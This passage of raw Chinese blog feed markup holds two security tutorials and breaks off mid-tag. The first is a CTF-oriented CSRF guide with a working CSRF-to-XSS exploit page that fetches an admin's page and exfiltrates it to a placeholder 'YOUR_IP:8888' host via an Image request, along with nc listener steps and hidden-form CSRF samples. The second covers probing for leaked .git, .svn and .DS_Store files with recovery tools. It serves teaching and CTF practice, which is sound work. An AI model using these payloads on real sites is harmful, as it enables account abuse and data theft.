class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF-to-XSS Exfiltration<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Triggering CSRF-to-XSS Attack<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// Construct the XSS payload. Dynamically split the closing tag to avoid premature termination.</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> payload = <span class="hljs-string">`&lt;scr`</span> + <span class="hljs-string">`ipt&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">      // Use fetch() to retrieve the homepage which includes the flag (after admin&#x27;s draft is published)</span></span><br><span class="hljs-string"><span class="language-javascript">      fetch(&quot;http://challenge.localhost/&quot;, &#123; credentials: &quot;include&quot; &#125;)</span></span><br><span class="hljs-string"><span class="language-javascript">        .then(response =&gt; response.text())</span></span><br><span class="hljs-string"><span class="language-javascript">        .then(data =&gt; &#123;</span></span><br><span class="hljs-string"><span class="language-javascript">          // Exfiltrate the data to the attacker&#x27;s server. Replace YOUR_IP:8888 with your attacker&#x27;s address.</span></span><br><span class="hljs-string"><span class="language-javascript">          var exfilUrl = &quot;http://YOUR_IP:8888/?flag=&quot; + encodeURIComponent(data);</span></span><br><span class="hljs-string"><span class="language-javascript">          new Image().src = exfilUrl;</span></span><br><span class="hljs-string"><span class="language-javascript">        &#125;)</span></span><br><span class="hljs-string"><span class="language-javascript">        .catch(error =&gt; console.error(&quot;Fetch error:&quot;, error));</span></span><br><span class="hljs-string"><span class="language-javascript">    &lt;/scr`</span> + <span class="hljs-string">`ipt&gt;`</span>;</span><br><span class="language-javascript">    </span><br><span class="language-javascript">    <span class="hljs-comment">// URL-encode the payload so it can be safely passed as a parameter</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> encodedPayload = <span class="hljs-built_in">encodeURIComponent</span>(payload);</span><br><span class="language-javascript">    <span class="hljs-comment">// Build the target URL using the /ephemeral endpoint which reflects the msg parameter</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> targetUrl = <span class="hljs-string">&quot;http://challenge.localhost/ephemeral?msg=&quot;</span> + encodedPayload;</span><br><span class="language-javascript">    <span class="hljs-comment">// Create an invisible iframe to force admin&#x27;s browser to load the target URL and execute our payload</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;iframe&quot;</span>);</span><br><span class="language-javascript">    iframe.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&quot;none&quot;</span>;</span><br><span class="language-javascript">    iframe.<span class="hljs-property">src</span> = targetUrl;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(iframe);</span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>部署步骤：</strong></p><ol><li><p>将上述代码保存为 <code>index.html</code>​，并将 <code>YOUR_IP:8888</code>​ 替换成你攻击机的实际 IP 和监听端口。</p></li><li><p>在你的攻击机上启动一个 HTTP 服务器，例如：</p><p> ​<code>python3 -m http.server 1337</code>​</p><p> 使恶意页面可通过 <code>http://hacker.localhost:1337/</code>​ 访问。</p></li><li><p>启动一个监听服务器（例如使用 netcat）：</p><p> ​<code>nc -l -p 8888 -v</code>​</p></li><li><p>使用 victim 工具触发 admin 访问你的恶意页面：</p><p> ​<code>/challenge/victim http://hacker.localhost:1337/</code>​</p></li><li><p>管理员的浏览器加载页面后，会通过 CSRF 触发反射型 XSS，进而执行 fetch() 请求，获取包含 flag 的页面内容，并通过 Image() 将数据 exfiltrate 到你的监听服务器。</p></li><li><p>检查 netcat 输出，从 exfiltrated 数据中提取出 flag。</p></li></ol><p>‍</p><h3 id="三、CTF-中的-CSRF-实战案例"><a href="#三、CTF-中的-CSRF-实战案例" class="headerlink" title="三、CTF 中的 CSRF 实战案例"></a>三、CTF 中的 CSRF 实战案例</h3><p>在 CTF 竞赛中，题目往往会设计一个脆弱的 Web 应用程序，让参赛者利用 CSRF 发起请求。一个典型的场景如下：</p><ul><li><strong>目标应用（pwnpost）：</strong><br>管理员的 flag 隐藏在草稿帖子中，只有在发布后才会完整显示。管理员默认不会发布草稿。</li><li><strong>攻击思路：</strong><br>利用 CSRF 诱使管理员浏览器发起一个 POST 请求到 <code>/publish</code>​，将草稿帖子发布。由于管理员的页面对草稿做了部分隐藏，所以发布后 flag 会完整显示。</li><li><strong>利用 CSRF-to-XSS 链：</strong><br>由于直接窃取 HttpOnly cookie 不可行，攻击者可以利用 CSRF 触发一个反射型 XSS 漏洞，从而在管理员浏览器中执行 JavaScript。该 JavaScript 使用 fetch() 请求目标页面，获取 flag 内容，再通过其他手段（例如 Image() 对象） exfiltrate 数据到攻击者服务器。</li></ul><p>‍</p><blockquote><p>跨站请求伪造（Cross-Site Request Forgery，简称 CSRF）是一种针对 Web 应用程序的攻击方式。通过 CSRF，攻击者诱导受害者在不知情的情况下，以受害者的身份执行非本意的操作。本文将详细介绍 CSRF 的基本原理、常见攻击方式、在 CTF 中的实战案例，以及如何防御 CSRF 攻击。</p></blockquote><h3 id="一、CSRF-的基本原理"><a href="#一、CSRF-的基本原理" class="headerlink" title="一、CSRF 的基本原理"></a>一、CSRF 的基本原理</h3><p><a href="https://so.csdn.net/so/search?q=CSRF%20%E6%94%BB%E5%87%BB&spm=1001.2101.3001.7020">CSRF 攻击</a>的核心思想是：<br><strong>如果受害者已经登录某个网站，那么攻击者可以诱使受害者的浏览器在后台自动发送请求，这个请求会自动携带受害者的身份验证信息（如 Cookie），从而导致非本意的操作。</strong></p><h4 id="1-1-浏览器与-Cookie-的关系"><a href="#1-1-浏览器与-Cookie-的关系" class="headerlink" title="1.1 浏览器与 Cookie 的关系"></a>1.1 浏览器与 Cookie 的关系</h4><ul><li><p><strong>Cookie 自动携带：</strong><br>当用户在浏览器中登录某个网站时，服务器会通过 Set-Cookie 将身份验证数据（如 SessionID）存储到浏览器中。以后，浏览器在访问同一网站时会自动带上这些 Cookie，无需用户额外操作。</p></li><li><p><strong>同源策略（SOP）：</strong><br>浏览器通过同源策略来限制脚本访问其它域的数据，但对于跨站表单提交（如 GET 或 POST 请求），浏览器会自动携带 Cookie。CSRF 就正是利用这一特点来伪造请求。</p></li></ul><h4 id="1-2-CSRF-攻击流程"><a href="#1-2-CSRF-攻击流程" class="headerlink" title="1.2 CSRF 攻击流程"></a>1.2 CSRF 攻击流程</h4><ol><li><p><strong>受害者登录：</strong><br> 受害者在目标网站（例如银行、论坛等）登录后，浏览器中保存了有效的 Cookie 和会话信息。</p></li><li><p><strong>攻击者构造恶意页面：</strong><br> 攻击者在自己控制的网站上（例如 hacker.localhost）制作一个恶意页面，该页面中嵌入了指向目标网站的请求。常见的方式包括使用隐藏的 HTML 表单、图片标签或 iframe 等。</p></li><li><p><strong>诱导受害者访问恶意页面：</strong><br> 攻击者通过钓鱼邮件、链接分享或其它方式诱导受害者访问恶意页面。当受害者访问时，浏览器会自动向目标网站发送请求，并携带受害者的 Cookie。</p></li><li><p><strong>目标网站执行操作：</strong><br> 由于请求中包含了合法的 Cookie，目标网站认为这是受害者本人发出的请求，从而执行敏感操作，如转账、修改密码、发布消息等。</p></li></ol><p>‍</p><h3 id="二、CSRF-攻击的常见方式"><a href="#二、CSRF-攻击的常见方式" class="headerlink" title="二、CSRF 攻击的常见方式"></a>二、CSRF 攻击的常见方式</h3><h4 id="2-1-隐藏表单自动提交"><a href="#2-1-隐藏表单自动提交" class="headerlink" title="2.1 隐藏表单自动提交"></a>2.1 隐藏表单自动提交</h4><p>攻击者在恶意页面中构造一个隐藏的 HTML 表单，并使用 JavaScript 自动提交。</p><p>示例代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;csrfForm&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://targetsite.com/transfer&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- 隐藏字段，如果目标接口需要参数 --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;to_account&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;attacker_account&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;amount&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;csrfForm&#x27;</span>).<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>这种方式依赖于浏览器自动提交表单，并且不会受到同源策略的限制，因为表单提交会自动携带 Cookie。</p><h4 id="2-2-利用图片或-iframe"><a href="#2-2-利用图片或-iframe" class="headerlink" title="2.2 利用图片或 iframe"></a>2.2 利用图片或 iframe</h4><p>攻击者利用 <code>&lt;img&gt;</code>​ 或 <code>&lt;iframe&gt;</code>​ 标签触发 GET 请求。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 触发 GET 请求，自动携带 Cookie --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://targetsite.com/delete_account?user=admin&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或使用 iframe：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://targetsite.com/perform_action?param=value&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="2-3-JavaScript-触发重定向"><a href="#2-3-JavaScript-触发重定向" class="headerlink" title="2.3 JavaScript 触发重定向"></a>2.3 JavaScript 触发重定向</h4><p>在受害者浏览器中使用 JavaScript 重定向到目标 URL，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;http://targetsite.com/perform_action?param=value&quot;</span>;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这种方式也会自动携带受害者的 Cookie，从而完成 CSRF 攻击。</p><p>‍</p><h3 id="四、防御措施"><a href="#四、防御措施" class="headerlink" title="四、防御措施"></a>四、防御措施</h3><p>为了防止 CSRF 攻击，常用的防御措施包括：</p><ul><li><strong>CSRF Token:</strong><br>在敏感表单中加入一个随机生成的 token，并在服务器端进行校验，确保请求来源正确。</li><li><strong>SameSite Cookie 属性：</strong><br>设置 Cookie 的 SameSite 属性（如 SameSite&#x3D;Lax 或 SameSite&#x3D;Strict），可以有效减少跨站请求中 Cookie 被自动发送的风险。</li><li><strong>双重验证:</strong><br>对于关键操作，要求用户在执行操作时进行额外确认（如验证码、短信验证等）。</li><li><strong>CSP（Content Security Policy）：</strong><br>限制外部脚本的加载，有助于降低 XSS 攻击风险，但对于 CSRF 攻击防护效果有限。</li></ul><p>‍</p><h3 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h3><p>CSRF 攻击利用浏览器自动携带 Cookie 的特点，让受害者在不知情的情况下执行敏感操作。在 CTF 竞赛中，题目往往会设计场景，让参赛者通过 CSRF 触发反射型 XSS，从而获取管理员页面中的 flag。<br>本文详细介绍了 CSRF 攻击的原理、常见方式以及一个实战案例，并讨论了如何防御此类攻击。</p><p>理解并掌握 CSRF 攻击有助于你在 CTF 中快速识别并利用漏洞，同时也能提高你对 Web 安全防护措施的理解。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>CSRF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>未命名</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试之敏感文件目录探测总结</title>
    <link href="/2025/05/20/Web/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B%E6%80%BB%E7%BB%93/"/>
    <url>/2025/05/20/Web/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试之敏感文件目录探测总结"><a href="#渗透测试之敏感文件目录探测总结" class="headerlink" title="渗透测试之敏感文件目录探测总结"></a>渗透测试之敏感文件目录探测总结</h1><h3 id="目录扫描的介绍"><a href="#目录扫描的介绍" class="headerlink" title="目录扫描的介绍"></a>目录扫描的介绍</h3><p>目录扫描可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构。通过目录扫描我们还能扫描敏感文件，后台文件，数据库文件，和信息泄漏文件等等</p><p>目录扫描有两种方式：</p><p>•使用目录字典进行暴力才接存在该目录或文件返回200或者403；•使用爬虫爬行主页上的所有链接，对每个链接进行再次爬行，收集这个域名下的所有链接，然后总结出需要的信息。</p><h3 id="常见敏感文件或目录"><a href="#常见敏感文件或目录" class="headerlink" title="常见敏感文件或目录"></a>常见敏感文件或目录</h3><p>通常我们所说的敏感文件、敏感目录大概有以下几种：</p><p>•robots.txt•crossdomain.xml•sitemap.xml•后台目录•网站安装目录•网站上传目录•mysql管理页面•phpinfo•网站文本编辑器•测试文件•网站备份文件（.rar、.zip、.7z、.tar、.gz、.bak）•DS_Store文件•vim编辑器备份文件（.swp）•WEB-INF&#x2F;web.xml文件</p><h4 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h4><h5 id="robots-txt是什么？"><a href="#robots-txt是什么？" class="headerlink" title="robots.txt是什么？"></a>robots.txt是什么？</h5><p>robots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被搜索引擎访问的部分，或者指定搜索引擎只收录指定的内容。当一个搜索引擎（又称搜索机器人或蜘蛛程序）访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。</p><h5 id="robots-txt的作用？"><a href="#robots-txt的作用？" class="headerlink" title="robots.txt的作用？"></a>robots.txt的作用？</h5><p>•引导搜索引擎蜘蛛抓取指定栏目或内容•网站改版或者URL重写优化时候屏蔽对搜索引擎的不友好的链接•屏蔽死链接、404错误页•屏蔽无内容、无价值页面•屏蔽重复页面，如评论页、搜索结果页•引导蜘蛛抓取网站地图</p><h5 id="robots-txt的语法？"><a href="#robots-txt的语法？" class="headerlink" title="robots.txt的语法？"></a>robots.txt的语法？</h5><p>•User-agent: （定义搜索引擎）<code>示例：User-agent: *            （定义所有搜索引擎）User-agent: Googlebot        （定义谷歌，只允许谷歌蜘蛛爬行）User-agent: Baiduspider        （定义百度，只允许百度蜘蛛爬行）不同的搜索引擎的搜索机器人有不同的名称，谷歌:Googlebot、百度:Baiduspider、MSN:MSNbot、Yahoo:Slurp。</code>​•Disallow: （用来定义禁止蜘蛛爬行的页面或目录）<code>示例：Disallow: /        （禁止蜘蛛爬行网站的所有目录&quot;/&quot;表示根目录下）Disallow:/admin        （禁止蜘蛛爬取/admin目录）Disallow: /abc.html    （禁止蜘蛛爬去abc.html页面）Disallow: /help.html     （禁止蜘蛛爬去help.html页面）</code>​•Allow：（用来定义允许蜘蛛爬取的页面或子目录）<code>示例：Allow: /admin/test/    （允许蜘蛛爬取admin下的test目录）Allow: /admin/abc.html    （允许蜘蛛爬去admin目录中的abc.html页面）</code>​</p><p><img src="/.com//image-20241106163307-mmk2zo3.png" alt="image"></p><p>img</p><h4 id="crossdomain-xml"><a href="#crossdomain-xml" class="headerlink" title="crossdomain.xml"></a>crossdomain.xml</h4><p>跨域，顾名思义就是需要的资源不在自己的域<a href="https://cloud.tencent.com/product/cvm?from_column=20065&from=20065">服务器</a>上，需要访问其他域服务器。跨域策略文件是一个xml文档文件，主要是为web客户端(如Adobe Flash Player等)设置跨域处理数据的权限。打个比方说，公司A部门有一台公共的电脑，里面存放着一些资料文件，专门供A部门内成员自己使用，这样，A部门内的员工就可以访问该电脑，其他部门人员则不允许访问。如下图：</p><p><img src="/.com//image-20241106163311-fa0g1ja.png" alt="image"></p><p>img</p><blockquote><p>A部门的员工可以任意访问A部门的公共电脑，但是不能直接访问B部门的公共电脑。有一天，B部门领导觉得他们的资料非常有用，想要与A部门分享，于是就给A部门一个令牌，这样A部门的员工也可以访问B部门的公共电脑了。A部门可访问B部门设置访问权限，这个权限设置就是跨域策略文件crossdomain.xml存在的意义。</p></blockquote><p>crossdomin.xml 示例文件如下，重点查看<code>allow-access-from</code>​字段获取网站目录信息</p><p><img src="/.com//image-20241106163316-rnv4jhi.png" alt="image"></p><p>img</p><h4 id="sitemap-xml"><a href="#sitemap-xml" class="headerlink" title="sitemap.xml"></a>sitemap.xml</h4><p>Sitemap 可方便网站管理员通知搜索引擎他们网站上有哪些可供抓取的网页。最简单的 Sitemap 形式，就是XML 文件，在其中列出网站中的网址以及关于每个网址的其他元数据（上次更新的时间、更改的频率以及相对于网站上其他网址的重要程度为何等），以便搜索引擎可以更加智能地抓取网站。</p><p><img src="/.com//image-20241106163325-ps5mgd3.png" alt="image"></p><p>img</p><h4 id="源代码泄露"><a href="#源代码泄露" class="headerlink" title="源代码泄露"></a>源代码泄露</h4><h5 id="git源代码泄露"><a href="#git源代码泄露" class="headerlink" title=".git源代码泄露"></a>.git源代码泄露</h5><p>Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p><p>利用工具：GitHack</p><p>项目地址：<a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p><p>扫描目录：</p><p><img src="/.com//image-20241106163330-cjsy4cy.png" alt="image">​</p><p>img</p><p>使用GitHack工具成功恢复代码</p><p><img src="/.com//image-20241106163334-jzkjv6l.png" alt="image"></p><p>img</p><h5 id="cvs源代码泄露"><a href="#cvs源代码泄露" class="headerlink" title=".cvs源代码泄露"></a>.cvs源代码泄露</h5><p>CSV是一个C&#x2F;S系统，多个开发人员通过中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对CVS&#x2F;Root以及CVS&#x2F;Entries目录，直接就可以看到泄露的信息。</p><p>返回根信息：<code>http://www.example.com/CVS/Root</code>​</p><p>返回所有文件的结构：<code>http://www.example.com/CVS/Entries</code>​</p><p>漏洞利用工具：dvcs-ripper</p><p>项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p><p>运行示例：</p><p>代码语言：javascript</p><p>复制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">rip-cvs.<span class="hljs-property">pl</span> -v -u <span class="hljs-attr">http</span>:<span class="hljs-comment">//www.example.com/CVS</span><br></code></pre></td></tr></table></figure><h5 id="svn源代码泄露"><a href="#svn源代码泄露" class="headerlink" title=".svn源代码泄露"></a>.svn源代码泄露</h5><p>SVN是一个开放源代码的版本控制系统。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要地方源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露在外网环境，可以使用.svn&#x2F;entries文件，获取到服务器源码。</p><p>漏洞利用工具：</p><p>Seay SVN漏洞利用工具</p><p><img src="/.com//image-20241106163339-zl38u6j.png" alt="image"></p><p>img</p><p>SvnExploit</p><p>项目地址：<a href="https://github.com/admintony/svnExploit/">https://github.com/admintony/svnExploit/</a></p><p>扫描站点存在&#x2F;.svn&#x2F;entries目录</p><p><img src="/.com//image-20241106163344-bnuftkb.png" alt="image"></p><p>img</p><p>成功恢复代码</p><p><img src="/.com//image-20241106163349-azvbv81.png" alt="image"></p><p>img</p><h5 id="hg源代码泄露"><a href="#hg源代码泄露" class="headerlink" title=".hg源代码泄露"></a>.hg源代码泄露</h5><p>Mercurial是一种轻量级分布式版本控制系统，使用hg init的时候会生成.hg。</p><p>漏洞利用工具：dvcs-ripper</p><p>项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p><p>运行示例：</p><p>代码语言：javascript</p><p>复制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">rip-cvs.<span class="hljs-property">pl</span> -v -u <span class="hljs-attr">http</span>:<span class="hljs-comment">//www.example.com/.hg/</span><br></code></pre></td></tr></table></figure><h4 id="DS-store文件泄露"><a href="#DS-store文件泄露" class="headerlink" title=".DS_store文件泄露"></a>.DS_store文件泄露</h4><p>.DS_store是Mac下Finder用来保存如何展示 文件&#x2F;文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_store上传部署到服务器，可能造成文件目录结构泄露，特别是备份文件、源代码文件。</p><p>漏洞利用工具：ds_store_exp</p><p>项目地址：<a href="https://github.com/lijiejie/ds/_store/_exp">https://github.com/lijiejie/ds\_store\_exp</a></p><p>运行示例：</p><p>代码语言：javascript</p><p>复制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">ds_store_exp.<span class="hljs-property">py</span> <span class="hljs-attr">http</span>:<span class="hljs-comment">//xxx.com/.DS_Store</span><br></code></pre></td></tr></table></figure><h4 id="网站备份文件泄露"><a href="#网站备份文件泄露" class="headerlink" title="网站备份文件泄露"></a>网站备份文件泄露</h4><p>管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。常见的备份文件后缀：<code>.rar</code>​、<code>.zip</code>​、<code>.7z</code>​、<code>.tar.gz</code>​、<code>.bak</code>​、<code>.txt</code>​、<code>.old</code>​、<code>.temp</code>​</p><h4 id="SWP文件泄露"><a href="#SWP文件泄露" class="headerlink" title="SWP文件泄露"></a>SWP文件泄露</h4><p>swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为.filename.swp。</p><h4 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF&#x2F;web.xml泄露"></a>WEB-INF&#x2F;web.xml泄露</h4><p>WEB-INF是Java的Web应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF主要包含以下文件或目录：</p><p>•WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了servlet和其他的应用组件及命名规则•WEB-INF&#x2F;database.properties：数据库配置文件•WEB-INF&#x2F;classes&#x2F;：一般用来存放Java类文件（.class）•WEB-INF&#x2F;lib&#x2F;：用来存放打包好的库（.jar）•WEB-INF&#x2F;src&#x2F;：用来存放源代码</p><p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接下载 class 文件，再通过反编译 class 文件，得到网站源码。</p><h3 id="敏感目录收集方式"><a href="#敏感目录收集方式" class="headerlink" title="敏感目录收集方式"></a>敏感目录收集方式</h3><h4 id="网页中寻找"><a href="#网页中寻找" class="headerlink" title="网页中寻找"></a>网页中寻找</h4><p>•在robots.txt中看能否发现敏感目录•F12源代码链接处•通过查看一些图片的属性路径，运气好会发现很多隐藏的目录 结合域名+目录，用御剑进行扫描，当然也可以手动输入一些常见的后台管理地址进行访问。</p><h4 id="其他端口中寻找"><a href="#其他端口中寻找" class="headerlink" title="其他端口中寻找"></a>其他端口中寻找</h4><p>有时候网站的不同端口中有一些便是专门的后台管理地址。根据经验总结，很多网站8080、8081端口是网站的管理地址。</p><p>例如：<code>http://www.xxx.com:8080</code>​</p><h4 id="网站分目录下寻找"><a href="#网站分目录下寻找" class="headerlink" title="网站分目录下寻找"></a>网站分目录下寻找</h4><p>有的时候网站会把管理地址放在一个分目录下，有的时候一个网站比较大，后台管理页面也比较多，就要分目录的去找，</p><p>例如：<code>http://www.xxx.com/test/admin/manage.php</code>​</p><p>你可以通过一些方式获取到网站的目录，然后在这个目录下进行扫描。当一个网站你扫描根目录没有任何收获时，这个时候通过分析网站的目录结构，然后扫描域名+目录，就能找出它的后台管理地址。</p><h4 id="子域名下寻找"><a href="#子域名下寻找" class="headerlink" title="子域名下寻找"></a>子域名下寻找</h4><p>有的时候网站的管理地址会放在子域名下，所以主站什么都找不到的情况下，如果发现子域名，就通过这些方法去子域名下找一下吧。</p><p>例如：<code>http://admin.xxx.com/login</code>​</p><h4 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h4><p>Google Hacking 一般是做为黑客在入侵时的一个手段.在入侵过程中有时需要查找后台的登陆口就需要用到Google Hacking。有时猜解密码的时候谷歌也是提供查找管理员资料的有效平台。是一种社会工程学获取目标信息的手段。可以用于跟踪某对象在网络上的各种踪迹（如交友平台、微博等）。</p><p>有关谷歌语法的介绍可参考第一章的第一节：1.开源情报与搜索引擎</p><h4 id="网站爬虫"><a href="#网站爬虫" class="headerlink" 